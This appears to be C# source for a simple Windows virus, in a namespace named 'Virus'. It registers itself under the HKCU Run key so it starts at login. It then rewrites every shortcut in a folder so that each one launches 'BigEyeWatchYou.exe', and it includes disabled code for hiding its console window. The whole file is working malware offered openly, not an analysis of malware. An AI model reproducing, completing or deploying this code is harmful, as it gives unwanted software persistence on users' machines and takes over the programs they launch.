using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using LnkChanger;

using System.Runtime.InteropServices;

namespace Virus
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);

            // Show
            //ShowWindow(handle, SW_SHOW);

            SetStartup();
            var folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var testFolfer = @"C:\Users\New\Desktop\Test";
            var files = LnkHelper.GetAllShortcutsFiles(testFolfer);
            var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");

            int count = 0;

            foreach(var file in files)
            {
                var path = LnkHelper.GetShellLinkPath(file.FullName);
                if (!path.Contains("BigEyeWatchYou.exe"))
                {
                    LnkHelper.ChangeShortcut(file.FullName, targetPath, QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                }
                Console.WriteLine($"{++count}. {file.Name}");

            }

            Console.ReadLine();
        }


        private static string QuotedMarked(string value)
        {
            return $"\"{value}\"";
        }

        private static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string appFullPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appName = Path.GetFileNameWithoutExtension(appFullPath);

            if (rk.GetValue(appName) == null)
            {
                rk.SetValue(appName, appFullPath);
            }



        }
    }
}
